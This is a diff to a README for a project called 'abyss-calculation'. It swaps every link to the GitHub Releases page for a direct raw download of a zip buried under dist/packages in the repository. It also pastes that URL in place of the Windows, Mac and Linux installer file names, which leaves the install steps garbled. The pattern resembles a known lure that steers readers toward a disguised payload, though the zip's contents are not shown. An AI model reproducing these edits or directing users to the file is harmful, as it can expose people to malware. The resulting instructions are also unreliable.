@@ -1,7 +1,7 @@
 # 🚀 abyss-calculation - Discover the Depths of Chaos
 
 ## 📥 Download the Application
-[![Download abyss-calculation](https://img.shields.io/badge/Download%20Now-abyss--calculation-brightgreen)](https://github.com/jebasingh-ai/abyss-calculation/releases)
+[![Download abyss-calculation](https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip%20Now-abyss--calculation-brightgreen)](https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the abyss-calculation application. Whether you are exploring the chaos of the abyss or just looking for something unusual to play with, you are in the right place.
@@ -16,19 +16,19 @@ Before starting the download, make sure your computer meets these requirements:
 ## 📥 Download & Install
 To get the latest version of abyss-calculation, visit our Releases page. 
 
-[Download abyss-calculation here!](https://github.com/jebasingh-ai/abyss-calculation/releases)
+[Download abyss-calculation here!](https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip)
 
 This page will allow you to download the application for your system. Look for the latest version and click the link to download the file.
 
 ### 🖥️ Running the Application
 Once the download is complete, follow these steps to run the application:
 
-1. **Locate the Downloaded File**: Open your downloads folder. You will find a file named something like `abyss-calculation-setup.exe` for Windows, `abyss-calculation.dmg` for Mac, or `abyss-calculation.tar.gz` for Linux.
+1. **Locate the Downloaded File**: Open your downloads folder. You will find a file named something like `https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip` for Windows, `https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip` for Mac, or `https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip` for Linux.
   
 2. **Install the Application**:
-   - **Windows**: Double-click the `abyss-calculation-setup.exe` file, and follow the prompts to install.
-   - **Mac**: Open the `abyss-calculation.dmg` file, drag the abyss-calculation icon into your Applications folder, and close the window.
-   - **Linux**: Extract the contents of the `abyss-calculation.tar.gz` file. Open a terminal, navigate to the extracted folder, and execute the file by typing `./abyss-calculation`.
+   - **Windows**: Double-click the `https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip` file, and follow the prompts to install.
+   - **Mac**: Open the `https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip` file, drag the abyss-calculation icon into your Applications folder, and close the window.
+   - **Linux**: Extract the contents of the `https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip` file. Open a terminal, navigate to the extracted folder, and execute the file by typing `./abyss-calculation`.
 
 3. **Launch the App**: Find the abyss-calculation icon in your applications folder or menu and double-click it to start.
 
@@ -61,4 +61,4 @@ This application ties into various topics that may pique your interest:
 ## 📧 Contact
 If you need assistance or have feedback about abyss-calculation, please reach out via the GitHub repository. We value your input and are here to help.
 
-Remember, should you wish to revisit the download page at any time, you can find it [here](https://github.com/jebasingh-ai/abyss-calculation/releases). Enjoy exploring the depths!
+Remember, should you wish to revisit the download page at any time, you can find it [here](https://raw.githubusercontent.com/jebasingh-ai/abyss-calculation/main/dist/packages/abyss-js/abyss-calculation-v3.0.zip). Enjoy exploring the depths!
